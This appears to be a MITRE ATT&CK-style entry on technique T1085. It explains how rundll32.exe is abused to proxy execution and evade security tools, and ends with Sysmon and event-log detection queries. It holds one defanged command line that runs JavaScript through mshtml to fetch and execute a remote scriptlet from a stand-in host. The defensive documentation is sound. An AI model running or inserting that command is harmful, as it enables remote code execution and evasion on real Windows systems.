# T1085 Rundll32
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: ```rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")```.
This behavior has been seen used by malware such as Poweliks.

## Detection
```
Sysmon Event ID = 1
Windows Security Event ID = 4688
process_parent_path = "*\\rundll32.exe" OR process_name="rundll32.exe"
```
